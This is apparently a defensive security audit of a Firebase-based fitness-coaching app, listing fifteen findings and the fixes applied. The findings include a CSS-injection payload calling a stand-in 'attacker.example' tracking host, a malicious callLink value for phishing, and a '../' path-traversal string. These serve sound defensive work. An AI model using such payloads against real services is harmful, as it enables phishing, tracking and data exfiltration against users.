# Wake — Adversarial Security Audit (Round 3)

**Date:** 2026-05-02
**Branch / HEAD:** `security-fix-campaign` @ `2d3e9af`
**Auditor:** independent re-audit (no prior-round materials consulted while
producing the findings below; the delta-vs-prior section at the bottom was
the only step that read `docs/archive/security-2026-05/`).
**Scope:** as briefed — `functions/`, `config/firebase/`, `apps/*/src/`,
`firebase.json`. Out of scope: prior-cycle archive corpus, `node_modules/`,
build outputs.

## Methodology notes

- **Test baseline.** `cd functions && npm test` passes 126 unit tests
  (middleware + helpers). 270 rules + integration tests are skipped because
  no Firestore emulator is running (`ECONNREFUSED 127.0.0.1:8080`); this
  matches the local-dev expectation and is not a regression. Findings below
  do not rely on rules-test execution.
- **Production data shape.** `scripts/archive/security-2026-05/shape-analysis.js`
  was executed read-only against `wolf-20b8b` on 2026-05-02 (output:
  `/tmp/shape.json`, not committed). Sample = 300 docs per top-level
  collection, 100 per subcollection group; redaction rules per the script's
  own `REDACTED_FIELDS` set. Key finding for F-2026-05-01: `courses`
  collection has 15 docs, `status` distribution = 14 × `"draft"`, 1 ×
  `"published"`, 0 × `"publicado"` — the legacy Spanish literal is dead
  data. Impact reassessment + remediation in the F-2026-05-01 entry below.
- **Numbering.** New finding IDs begin with `F-2026-05-NN` so they cannot
  collide with Round 1/2 IDs in the codebase.

---

## Findings

### F-2026-05-01 — `isFreeGrantAllowed` accepts Spanish-published / unknown statuses as drafts (FIXED)
**Severity:** Medium (downgraded from High after shape-analysis: 0 prod courses with `"publicado"`; remaining surface is the unknown-status / future-import case)
**Status:** Fixed in this branch — see "Remediation applied" below.
**File:** [functions/src/api/middleware/securityHelpers.ts:124-145](functions/src/api/middleware/securityHelpers.ts#L124-L145), reached from [functions/src/api/routes/profile.ts:474-499](functions/src/api/routes/profile.ts#L474-L499)

`isFreeGrantAllowed` decides whether `POST /v1/users/me/move-course` may grant
a course to the caller for free. Its draft branch is

```ts
const status = ctx.course.status;
if (status && status !== "published") return true;
```

The codebase treats both `"published"` and `"publicado"` as published —
firestore.rules accepts either ([config/firebase/firestore.rules:189-195](config/firebase/firestore.rules#L189-L195)),
and the creator dashboard short-circuits drafts on `status !== 'published' && status !== 'publicado'`
([apps/creator-dashboard/src/screens/BundleDetailScreen.jsx:508](apps/creator-dashboard/src/screens/BundleDetailScreen.jsx#L508)).
The rules unit-test fixture even seeds a deliberately-published Spanish course
([apps/creator-dashboard/src/__tests__/firestore.rules.test.js:58](apps/creator-dashboard/src/__tests__/firestore.rules.test.js#L58)).

Because the helper compares only against the English literal, any course
where `status === "publicado"` (or any non-empty value other than
`"published"`) is misclassified as a draft, returning `true` and granting
the caller an active enrollment with no payment. That's the audit-C-01
monetization bypass with the "publicado" half of the data still loaded.

**Repro (data-shape-dependent).**
1. Locate any course with `status: "publicado"` and a non-zero `price` and
   `subscription_price` whose `creator_id !== caller`.
2. As a regular `role:"user"` caller, `POST /v1/users/me/move-course` with
   `{courseId: "<that id>"}`.
3. Caller's `users/{uid}.courses[<id>]` is set to `status:"active"` for the
   course's full `access_duration` window — no payment row exists in
   `processed_payments`.

**Recommended fix.** Treat the legacy literal as published in this helper
(the only place where the predicate flips truly-published into truly-draft):

```ts
const isPublished = status === "published" || status === "publicado";
if (status && !isPublished) return true;
```

…and replace the log emission at [profile.ts:496](functions/src/api/routes/profile.ts#L496)
to mirror the same predicate so the post-fix `reason:"draft"` only fires for
genuine drafts.

**Pre-merge verification.** Done — shape-analysis run 2026-05-02 against
`wolf-20b8b`. Result: zero `"publicado"` courses in prod, severity
downgraded to Medium (defense-in-depth + future-import risk).

**Remediation applied (this branch).**
1. `securityHelpers.ts` — replaced the blacklist `status !== "published"`
   with an explicit allowlist `FREE_GRANTABLE_STATUSES = {"draft","archived"}`.
   Any unknown status (`"publicado"`, typos, missing field) now defaults
   to "treat as published" → no free grant.
2. `profile.ts` — `move-course.granted` log `reason` field switched to
   the same allowlist for consistency.
3. `firestore.rules` — `'publicado'` branch removed from `match /courses/{courseId}`
   read predicate (dead path per shape-analysis).
4. Client dead branches removed: `BundleDetailScreen.jsx:508`,
   `CreateBundleFlow.jsx:275`, `CreatorProfileScreen.js:280`.
5. New unit tests in `securityHelpers.test.ts` pin the new behavior:
   `"publicado"` and unknown / typo statuses are rejected against paid
   courses.
6. Rule-test fixtures updated (`security.content.test.ts:99-115`,
   `firestore.rules.test.js:77-80`, `prod-shape-replay.test.ts:75-92`)
   to assert the new "publicado is denied" semantics.

**Verification.** `npm test` in `functions/` passes 128 / 270 skipped
(emulator-dependent). `npm run build` clean. No new lint errors in
touched files. The 270 emulator tests must run before merge — emulator
boot was not approved during this session.

---

### F-2026-05-02 — Event `image_url` rendered into CSS context with HTML-only escape (FIXED)
**Severity:** Medium
**Status:** Fixed in this branch — see "Remediation applied" below.
**Files:** [functions/src/index.ts:2266](functions/src/index.ts#L2266), [functions/src/index.ts:2299](functions/src/index.ts#L2299); rule gap at [config/firebase/firestore.rules:431-443](config/firebase/firestore.rules#L431-L443)

`sendEventConfirmationEmail` renders the registrant a Wake-branded HTML
email that interpolates the event cover image into a CSS `background-image`
declaration:

```ts
const eventImageUrl = escapeHtml((event.image_url as string | undefined) ?? "");
// ...
background="${eventImageUrl}"
style="...background-image:url('${eventImageUrl}');background-size:cover;..."
```

`escapeHtml` (functions/src/api/services/emailHelpers.ts:9-16) escapes only
`& < > " '` to entities. Once the browser HTML-decodes the `style` attribute,
those entities revert to their literals before the CSS parser runs, so a
crafted `image_url` such as

```
https://wakelab.co/x.jpg'); background-image:url('https://attacker.example/track.png?e=
```

decodes inside the style attribute to

```
background-image:url('https://wakelab.co/x.jpg'); background-image:url('https://attacker.example/track.png?e=...');background-size:cover;...
```

— a creator-controlled URL parsed as a second `background-image` value.
Email clients vary in how they render multiple `background-image`s, but
the attack surfaces include exfiltration via tracking pixel, Wake-branded
phishing imagery, and (in clients that don't strip CSS aggressively)
arbitrary CSS.

The API path (`PATCH /creator/events/:eventId`) does call
`assertHttpsUrl(updates.image_url, "image_url")`
([functions/src/api/routes/events.ts:444](functions/src/api/routes/events.ts#L444))
— but the firestore.rules `events/{eventId}` update rule places no
constraint on `image_url`. A creator with a Firebase ID token can write
the malicious value directly through the Firestore Web SDK (the rule only
locks `creator_id`, `created_at`, `registration_count`); the API
validation is then trivially bypassed, and the cron's email goes out with
the unsanitized URL.

**Remediation applied (this branch).**
1. `functions/src/index.ts` `sendEventConfirmationEmail` —
   `eventImageUrl` is now built by parsing the raw value with `new URL()`,
   rejecting any non-`https:` scheme, any URL with credentials, any URL
   exceeding 2048 chars, and as a paranoia stop any URL containing `'`,
   `"`, `(`, `)`, `<`, `>` after normalisation. The `escapeHtml` call is
   removed — the validated URL is now safe to interpolate inside `url('…')`
   without further escaping (a standards-compliant URL serializer never
   emits the disallowed characters unencoded).
2. `firestore.rules` `match /events/{eventId}` update rule — added a
   `request.resource.data.keys().hasOnly([...])` allowlist mirroring
   `events.ts:424`'s API-side allowedFields. A creator using the JS SDK
   directly can no longer slip arbitrary keys past the rule, so the
   API-side `assertHttpsUrl(image_url)` is no longer the only gate.

**Verification.** Manual trace: a malicious `image_url` like
`https://wakelab.co/x.jpg'); background:url('https://attacker.example/track.png?e=`
fails `new URL()`'s scheme/credentials check on the first failed validation
and is reduced to the empty string; the email renders without a hero image
rather than with creator-controlled CSS. Rule layer integration must be
revalidated under the emulator — pending the suite run noted above.

---

### F-2026-05-03 — Booking `callLink` rule path bypasses API allowlist (FIXED)
**Severity:** Medium
**Status:** Fixed in this branch — see "Remediation applied" below.
**Files:** [config/firebase/firestore.rules:362-372](config/firebase/firestore.rules#L362-L372), email render at [functions/src/index.ts:3315](functions/src/index.ts#L3315)

`POST /v1/creator/bookings/.../callLink` runs `assertAllowedCallLinkUrl`
([functions/src/api/middleware/securityHelpers.ts:256-270](functions/src/api/middleware/securityHelpers.ts#L256-L270))
to constrain the conferencing URL to a vendor allowlist. The `sendCallReminders`
cron then renders the URL into the reminder email's CTA button:

```ts
${callLink ? `<a href="${escapeHtml(callLink)}" style="...">Unirse a la llamada</a>` : ""}
```

`escapeHtml` does not enforce a URL scheme, so a `javascript:` URL or an
attacker-controlled http URL emerges as a normal `<a href=…>` after the
browser decodes the entities.

The firestore.rules `call_bookings` update rule allows the creator side
(`resource.data.creatorId == request.auth.uid`) to write **any field with
no shape constraint** — including `callLink`. A creator who calls
`updateDoc(...)` directly via the Web SDK (rather than the API) writes
`callLink: "https://attacker.example/phish"` (or `"javascript:..."`) and
the cron then mails their client a Wake-branded reminder linking to it.

**Remediation applied (this branch).**
1. `functions/src/index.ts` `sendCallReminders` — added a `safeCallLink`
   helper inside the cron that re-runs `assertAllowedCallLinkUrl` per
   booking and returns `""` on failure. Both the 24h and 1h reminder
   blocks now use the validated value. A dropped URL is logged at
   `warn` level with `bookingId` + `creatorId` for forensic visibility.
2. `assertAllowedCallLinkUrl` import added to the top-level imports of
   `index.ts` (already exported from `securityHelpers.ts`).

A future change should also add a `request.resource.data.keys().hasOnly([...])`
allowlist on the `call_bookings` update rule to prevent arbitrary
field injection by the creator side, similar to F-2026-05-02's events
fix. This audit's scope was the creator → email vector; the rule
hardening is left as the bookings-route's own follow-up.

---

### F-2026-05-04 — `nutritionFoodSearch` / `nutritionFoodGet` rate limit is per-instance, not per-caller
**Severity:** Medium
**Files:** [functions/src/index.ts:1902-1981](functions/src/index.ts#L1902-L1981) and surrounding nutrition Gen1 endpoints

The Gen1 FatSecret proxies (`nutritionFoodSearch`, `nutritionFoodGet`,
`nutritionBarcodeLookup`) gate access on App Check only — no Firebase Auth
— and rely on an in-memory rate limiter for abuse. F-MW-02 specifically
called out the same problem on the API path (Gen1 `checkRateLimit`
in-memory map fails when many instances run); the fix replaced it with the
Firestore-backed limiter for Gen2 routes, but the Gen1 nutrition exports
still call the legacy in-memory `checkRateLimit` (search the file — there
is no Firestore-backed call from these handlers).

Practical consequence: a single attacker holding a valid App Check token
(any debug/test token in the environment, or a user agent able to mint
real ones from a logged-in PWA session) can drive billable FatSecret
requests through these proxies up to FatSecret's own quotas, with
instance-spread defeating the per-instance counter.

**Recommended fix.** Either route nutrition through the Gen2 path that
already enforces the Firestore-backed limiter, or import
`checkIpRateLimit`/`checkRateLimit` from `api/middleware/rateLimit.ts` and
call it directly from these onRequest handlers. The accepted-risk note in
the file ("retired when Gen2 nutrition migration completes") should be
revisited if the migration is not imminent.

---

### F-2026-05-05 — `validateStoragePath` and `assertAllowedDownloadPath` bypass via `..` in non-leading segments
**Severity:** Low
**Files:** [functions/src/api/middleware/validate.ts:219-229](functions/src/api/middleware/validate.ts#L219-L229), partial-coverage helper at [functions/src/api/middleware/securityHelpers.ts:76-102](functions/src/api/middleware/securityHelpers.ts#L76-L102)

`validateStoragePath` only checks `storagePath.startsWith(expectedPrefix)`.
A client that provides `profile_pictures/<uid>/../../<victim-uid>/profile.jpg`
satisfies `startsWith("profile_pictures/<uid>/")` and proceeds to the
`bucket.file(storagePath).exists()` check. GCS object names are flat
strings — `..` is just a literal — so the call returns `true` only if the
attacker happens to know an object with that exact name exists, which
limits the immediate exploitability.

The risk surfaces when the validated path is later used in places that DO
normalize segments (some libraries, certain OS-level temp paths, manual
string splits in callers). `assertAllowedDownloadPath` already applies
the right defense (`if (path.includes("..") || path.startsWith("/") || path.includes("\0"))`)
and should be the reference; `validateStoragePath` should adopt the same
checks.

**Recommended fix.** Mirror the `..` / `\0` / leading-`/` rejection from
`assertAllowedDownloadPath` into `validateStoragePath`, and call it from
every signed-URL confirm route.

---

### F-2026-05-06 — `lookupUserForCreatorInvite` reads role from Firestore after F-MW-08 deprecated that source
**Severity:** Low (defense-in-depth)
**File:** [functions/src/index.ts:1716-1725](functions/src/index.ts#L1716-L1725)

`validateAuth`/`validateAuthAndRateLimit` were hardened in F-MW-08 to take
role authority **only** from the decoded Firebase ID-token claim, because
the Firestore `users/{uid}.role` field has been written from places that
aren't the canonical promotion path historically. The Gen1 callable
`lookupUserForCreatorInvite` predates the migration and still reads role
from Firestore:

```ts
const creatorDoc = await db.collection("users").doc(creatorId).get();
const role = creatorDoc.exists ? (creatorDoc.data()?.role as string | undefined) : undefined;
if (role !== "creator" && role !== "admin") {
  throw new functions.https.HttpsError("permission-denied", ...);
}
```

Today this is safe because F-RULES-01 locks the `role` field out of
owner-writable fields and onUserCreated stamps `role:"user"` deterministically.
But the codebase rule for "Firestore role is not authoritative" exists for a
reason — every divergence is a future-bug surface. The Gen1 callable is on
the deprecation list, so this can be a quick switch to claim-based auth via
the same `roleFromClaim` helper used in `validateAuth`.

**Recommended fix.** Resolve role from `context.auth.token.role` directly:

```ts
const role = (context.auth?.token as Record<string, unknown> | undefined)?.role;
if (role !== "creator" && role !== "admin") { ... }
```

…or accelerate the Gen1 callable's retirement.

---

### F-2026-05-07 — `client_plan_content` create allows any creator to write to any clientId
**Severity:** Low
**File:** [config/firebase/firestore.rules:651-654](config/firebase/firestore.rules#L651-L654)

```
match /client_plan_content/{docId} {
  allow create: if isCreator() && request.resource.data.creatorId == request.auth.uid;
  ...
}
```

There is no relationship check that `request.resource.data.clientId` is in
fact a one-on-one client of the creating creator. The sibling collections
that carry the same content shape — `nutrition_assignments` and
`client_nutrition_plan_content` — were locked to `allow write: if isAdmin()`
in F-RULES-09 / F-RULES-10 precisely because rule-layer relationship checks
are infeasible and the API path enforces the constraint. `client_plan_content`
was missed.

Today's path is read-only via API (the dashboard uses Admin-SDK-mediated
endpoints), so the rule create branch is unused — the inconsistency is
defense-in-depth, not an active exploit. But in the current state any
authenticated creator can fabricate a content row pointed at any `clientId`
and have that surface in the victim client's read query
(`resource.data.clientId == auth.uid`).

**Recommended fix.** `allow write: if isAdmin();` to align with the
nutrition siblings; let the API stay the only path that creates these rows.

---

### F-2026-05-08 — `event_signups/.../registrations` rule allows unauth writes that the Cloud Function rate-limits, doubling the entry path
**Severity:** Low
**File:** [config/firebase/firestore.rules:457-471](config/firebase/firestore.rules#L457-L471)

The rule lets unauthenticated callers create registration docs directly
when the parent event is `wake_users_only != true`:

```
(!isSignedIn()
  && get(...).data.get('wake_users_only', false) == false
  && !('userId' in request.resource.data.keys()))
```

The accompanying comment notes "the Cloud Function rate-limits the unauth
flow." But rules accept Firestore-SDK writes that bypass the function
entirely — only the function-mediated path (`POST /v1/events/:eventId/register`)
ever sees the IP rate limit ([functions/src/api/app.ts:91-103](functions/src/api/app.ts#L91-L103)).
A spammer pointing the JS SDK at the public event collection drops in
arbitrary registrations bounded only by Firestore's per-doc cost.

The doc shape is capped (key allowlist via `hasOnly([...])`), and only
`wake_users_only != true` events are exposed, so no auth bypass — but
this is unbounded write volume with no abuse signal in the function
logs.

**Recommended fix.** Either deny unauth writes at the rule layer
(`allow create: if isSignedIn() && ...`) and force the public event
flow through the API, or leave the rule but require the function-set
sentinel field (e.g. `request.resource.data.source == "function"`) which
the SDK can't legitimately produce, paired with Admin-SDK-only writes from
the function. The first option is simpler and preferred.

---

### F-2026-05-09 — In-memory rate-limit + spoofable `X-Forwarded-For` first hop on `wakeClientErrorsIngest`
**Severity:** Low
**File:** [functions/src/ops/clientErrorsIngest.ts:42-59](functions/src/ops/clientErrorsIngest.ts#L42-L59)

`wakeClientErrorsIngest` is `cors:false` + accepts allowlisted origins,
so it's a real anti-spam target. Its rate limit lives in `ipBuckets`,
a per-instance `Map`. Cloud Run scales horizontally, so the limit is
only meaningful at low volume; under burst load each new instance starts
fresh.

Additionally, `clientIp(req)` reads `req.header("x-forwarded-for")` and
takes `split(",")[0].trim()` as the client IP. Behind the GCP HTTPS load
balancer, XFF is `"<client-supplied-XFF>, <real-client-ip>, <lb-internal>"` —
the first entry is attacker-controlled, so the rate-limit bucket is keyed
on a value the attacker can rotate freely. Net effect: per-IP rate limit
is unenforceable for any motivated abuser.

**Recommended fix.** (a) Move the bucket map to Firestore (mirror
`api/middleware/rateLimit.ts:checkIpRateLimit`); (b) prefer the *last*
trustworthy hop in XFF (the entry GCP appends), or use `req.ip` with
`app.set('trust proxy', 1)` + Express's `trust proxy` IP resolution.

---

### F-2026-05-10 — `opsApi` API key compared with `===`, accepted via query string
**Severity:** Low
**File:** [functions/src/ops/opsApi.ts:47-72](functions/src/ops/opsApi.ts#L47-L72)

Two issues, one fix each:

```ts
const ok = provided.length === expectedTrim.length && provided === expectedTrim;
```
String `===` is short-circuit and not constant-time. With Cloud Functions'
network-jitter floor the timing channel is small in practice, but the
canonical fix is `crypto.timingSafeEqual`.

```ts
const query = ((req.query?.key as string | undefined) || "").toString().trim();
const provided = header || query;
```
Accepting the secret as `?key=` puts it into URL access logs, browser
history, GCP request-log fields, and the Referer header on any subsequent
fetch from the page that received it. The header path
(`x-wake-ops-key`) should be the only accepted location for a shared
secret.

**Recommended fix.** Use `crypto.timingSafeEqual(Buffer.from(provided), Buffer.from(expectedTrim))`
gated on equal lengths, and drop the query-param fallback (rate-limited
operators can attach the header from any modern HTTP client).

---

### F-2026-05-11 — Rate-limit `expires_at` field is an integer-of-minutes, not a Firestore `Timestamp`
**Severity:** Informational
**File:** [functions/src/api/middleware/rateLimit.ts:36-41, 87-91](functions/src/api/middleware/rateLimit.ts#L36-L41)

The TODO at the top of the file flags that no TTL policy is configured.
Even after the policy is configured, the documents written here will not
expire: Firestore TTL requires a `Timestamp` field, but the code writes
`expires_at: windowMinute + 2` (a small integer). The `rate_limit_*`
collections will accumulate in perpetuity.

**Recommended fix.** Switch to:

```ts
expires_at: admin.firestore.Timestamp.fromMillis((windowMinute + 2) * 60_000),
```
…and configure the TTL policy on `rate_limit_windows` and
`rate_limit_first_party` against the `expires_at` field.

---

### F-2026-05-12 — `safeErrorPayload` whitelist loop is dead code
**Severity:** Informational (bug, not a security issue)
**File:** [functions/src/api/middleware/securityHelpers.ts:467-470](functions/src/api/middleware/securityHelpers.ts#L467-L470)

```ts
for (const k of Object.keys(e)) {
  if (SAFE_ERROR_DROP_KEYS.has(k)) continue;
}
```

The body of the loop is empty — it's the residue of a pattern that should
read "for each non-blocked key, copy it to `out`." Today the function
returns only the explicitly-handled `message`, `name`, `code`, `status`,
`statusCode` fields, which is in fact what the docstring asks for. The
loop is harmless, but it makes future readers think the drop list is
load-bearing when in fact the function strips everything not in the
explicit branch. Either delete the loop or restore the missing
`out[k] = e[k]` body and prune the drop list — pick one.

---

### F-2026-05-13 — `PATCH /v1/users/me` allows arbitrary HTTPS `profilePictureUrl`, sidestepping the storage signed-URL flow
**Severity:** Low
**File:** [functions/src/api/routes/profile.ts:179-192](functions/src/api/routes/profile.ts#L179-L192)

`profilePictureUrl` is in `urlFields` and validated only to "be HTTPS, ≤2048
chars." Anywhere it later renders as `<img>` (public profile, creator card),
it points wherever the user wants — including a tracker pixel. The signed-
URL confirm flow ([profile.ts:291-321](functions/src/api/routes/profile.ts#L291-L321))
is the intended source of profile picture URLs and writes a path-bound
firebasestorage.googleapis.com URL via Admin SDK; this PATCH bypasses
that constraint.

**Recommended fix.** Reject `profilePictureUrl` in the PATCH allowlist and
let the dedicated confirm route be the only way to set it. (Same applies
to `photoURL`/`profile_picture_url` if the dashboard exposes them.)

---

### F-2026-05-14 — `PATCH /v1/users/me` permits unbounded object payloads for `onboardingData` / `creatorOnboardingData` / `socialLinks`
**Severity:** Low
**File:** [functions/src/api/routes/profile.ts:207-213](functions/src/api/routes/profile.ts#L207-L213)

The handler checks `typeof value === "object"` and rejects arrays, but
applies no size or shape cap. `validateBody`'s 50KiB object cap is not
hit because this handler picks fields manually. A user can write an
arbitrarily large `onboardingData` object until the document hits the
1MiB Firestore limit, after which their entire user doc becomes
unwriteable.

**Recommended fix.** Use the `validateBody` flow for this handler with a
typed schema (the file already imports `validateBody`), or add a
per-field `JSON.stringify(value).length > N` guard for the object fields.

---

### F-2026-05-15 — `/users/:userId/public-profile` returns `birthDate`, `city`, `country` for non-creator users
**Severity:** Low
**File:** [functions/src/api/routes/profile.ts:323-353](functions/src/api/routes/profile.ts#L323-L353)

Any authenticated user can hit `GET /v1/users/<any-uid>/public-profile` and
receive the target's birthDate, city, and country. For creator profiles
this is in scope (public-facing creator card). For regular `role:"user"`
accounts it leaks PII. Combined with a leaked uid (e.g., from a creator
import flow), this becomes a directory harvest of attributes.

**Recommended fix.** Branch on the target user's role: for non-creator
accounts, return only `userId`, `displayName`, `username`,
`profilePictureUrl`, `role`. The current shape is fine for creators.

---

## Verified safe (confirmed clean during this audit)

These were checked end-to-end and came up clean. Future auditors can
skip / sample-check rather than redo the same work.

- **MercadoPago webhook signature validation (Gen1 + Gen2).** Both
  `processPaymentWebhook` ([functions/src/index.ts:496](functions/src/index.ts#L496))
  and `POST /payments/webhook` ([functions/src/api/routes/payments.ts:483](functions/src/api/routes/payments.ts#L483))
  parse the `x-signature` header, verify HMAC-SHA-256 with
  `crypto.timingSafeEqual`, enforce a ±5-minute timestamp window, and
  fall back to the legacy raw-body HMAC only when the new header is
  absent. Idempotency is enforced via a Firestore transaction on
  `processed_payments/{paymentId}`.
- **`onUserCreated` claim/role bootstrap.** Always writes
  `role:"user"` to the user doc and `setCustomUserClaims({role:"user"})`,
  never reads any pre-existing role.
- **App Check enforcement on first-party API.** `enforceAppCheck` honours
  `APP_CHECK_ENFORCE=false` only when `FUNCTIONS_EMULATOR=true`, and
  invalid (forged/stale) tokens 401 unconditionally.
- **API token cache.** Keyed on full SHA-256 (not truncated), TTL
  clamped to the smaller of 5 min and the token's own remaining
  lifetime; eviction is FIFO at size 50.
- **Firestore rules `users/{uid}` lockdown (F-RULES-01/02).** `role`,
  `courses`, `subscriptions`, `email`, `email_verified`, `trial_used`,
  `purchased_courses`, `username`, `created_at`, `cards` are all gone
  from the owner-writable allowlist. Owner can only update profile-shape
  fields; admin retains full update.
- **Storage rules signed-URL paths.** `profile_pictures/{userId}/`,
  `progress_photos/{userId}/`, `body_log/{userId}/`,
  `creator_feedback_attachments/{creatorId}/` all enforce
  `auth.uid == userId/creatorId` for write, with size + content-type
  caps. Cross-creator writes to `exercises_library`, `courses/`, and
  `events/` are bound to the parent doc's `creator_id` (F-RULES-25/26/27/28).
- **`updateSubscriptionStatus` transition guard (H-20).** The
  state-machine `assertAllowedSubscriptionTransition` rejects
  cancel-after-cancel / resume-after-cancel; `cancelled_at` is
  only set if absent.
- **MercadoPago preapproval hijack guard (H-21).** Both webhooks
  require an existing local `users/{uid}/subscriptions/{preapprovalId}`
  doc whose userId matches the parsed external_reference before
  applying any `set({merge:true})`.
- **Broadcast email body sanitizer.** `sanitizeBroadcastHtml` runs
  `sanitize-html` with an explicit allowlist + scheme allowlist and
  forces `target="_blank" rel="noopener noreferrer"` on every link;
  the only path producing creator HTML for end-user mail goes through
  it.
- **Unsubscribe token verification.** `verifyUnsubscribeToken` is HMAC-
  SHA-256 over `email:creatorId` keyed by `UNSUBSCRIBE_SECRET`, compared
  with `crypto.timingSafeEqual`. Tokens cannot be regenerated by an
  attacker who knows email + creatorId only.
- **API key validation.** `wk_live_...` keys are hashed with SHA-256 at
  storage; the lookup query is `where("key_hash", "==", hash)`, the raw
  key is never persisted, and demoted owners' keys are rejected
  (F-NEW-03).
- **Public OG meta-tag injection (`eventPage`).** `escapeOgAttr` covers
  the full HTML attribute special-char set (`& " ' < >`); meta tag
  values are HTML-attribute context only, so the URL never reaches a
  JavaScript-executing sink.
- **Hosting CSP.** `frame-ancestors 'none'`, `base-uri 'self'`,
  `form-action 'self'` are set on every SPA path; HSTS preload + nosniff
  + Permissions-Policy lock down browser features. The `'unsafe-inline'`
  in script-src/style-src is a known limitation on Vite/CRA SPAs and
  was not flagged.
- **`/email/unsubscribe` page.** Token-keyed, message text is
  hardcoded in the function (only `escapeHtml`'d as defense-in-depth).
- **Client-side XSS sinks.** `dangerouslySetInnerHTML` in the codebase:
  one site (LabMuscleHeatmap) interpolates a sanitized SVG fetched
  from a static asset URL, the other (SvgIcon) runs DOMPurify with the
  SVG profile + a strict color regex.
- **Validation against prototype pollution.** `validateBody` and
  `pickFields` both reject `__proto__`, `constructor`, `prototype` keys.

---

## Delta vs prior cycle

After the findings above were drafted, I read
`docs/archive/security-2026-05/` to compare. Summary:

- **Re-discovered from Round 1/2 still open.** Several findings I derived
  independently match prior IDs that the campaign tracker did not list as
  closed. These are the same vulnerabilities, not new ones:
  - **F-2026-05-02 ↔ Round 1 F-FUNCS-16** (CSS injection via event
    `image_url`). Round 2 fix was at the API layer only
    (`assertHttpsUrl` at events.ts:443, called out in the campaign list);
    the cron's render path and the rule-layer bypass were not closed.
  - **F-2026-05-03 ↔ Round 1 F-FUNCS-28** (`sendCallReminders` does not
    re-validate `callLink`). Not in the campaign closed list.
  - **F-2026-05-04 ↔ Round 1 F-FUNCS-13** (Gen1 nutrition proxies require
    only App Check + per-instance rate limit). Not in the campaign closed
    list; the file-level "accepted risk" comment is the same.
  - **F-2026-05-12 ↔ Round 1 F-FUNCS-01** (`safeErrorPayload` whitelist
    loop is dead code).
  - **F-2026-05-15 ↔ Round 1 F-API1-01** (PII in `/users/:userId/public-profile`).
    Round 2 sample-checked but did not adjust the response shape for
    non-creator targets.
- **Adjacent fixes from Round 2 my findings build on.**
  - Round 2 F-API1-08 / M-38 covered the API-side `image_url` sanitization
    (now `assertHttpsUrl` in events.ts); the rule-layer bypass that
    F-2026-05-02 documents is the leftover defense gap.
  - F-MW-08 fixed `validateAuth` role authority to claims; F-2026-05-06
    is the corresponding Gen1-callable holdover.
  - F-FUNCS-20 fixed unsubscribe HMAC; verification path confirmed
    clean here.
  - F-RULES-09/10 admin-locked `nutrition_assignments` and
    `client_nutrition_plan_content`; F-2026-05-07 is the missing
    sibling lockdown on `client_plan_content`.
- **Note on F-2026-05-01 (Spanish-published free-grant).** The Round 2
  decisions doc (`SECURITY_FIX_DECISIONS.md` §11.1.8) records that the
  rule's `'publicado'` branch was treated as "dead code [to] get fixed in
  Tier 1 alongside F-RULES-19." Today the rule still accepts both
  literals (firestore.rules:189-195), and `isFreeGrantAllowed` checks
  only the English literal — so if the rule's tolerance for `'publicado'`
  is in fact load-bearing for any production course (or for any future
  imported one), the monetization bypass is reachable. Whichever way
  the data actually lands, the helper should match the rule.
- **Issues from prior cycles I checked and confirmed remediated.**
  - Audit C-01 monetization bypass (free `move-course`): closed; the
    handler now goes through `isFreeGrantAllowed`. The Spanish-status
    edge case in F-2026-05-01 is a regression-of-a-fix, not an
    unfixed original finding.
  - Audit H-15/H-16 webhook race + double-grant: closed via Firestore
    transaction wrapping `assignCourseToUser` + `processed_payments`
    finalization.
  - Audit H-21 preapproval hijack: closed; both webhooks now require
    matching local subscription doc.
  - Audit H-25 user course status enum: closed; `assertAllowedUserCourseStatus`.
  - Audit H-26 broadcast HTML phishing: closed; `sanitizeBroadcastHtml`.
  - Audit H-17/H-18 bundle assignment + refund handling: closed in
    Gen1 + Gen2.
- **Not re-tested in this audit.** Property/concurrency fuzz tests in
  `functions/tests/security/` require the Firestore emulator (skipped
  here, see baseline notes). Re-running them is the obvious next step
  before promoting the fixes for the findings above.

End of report.
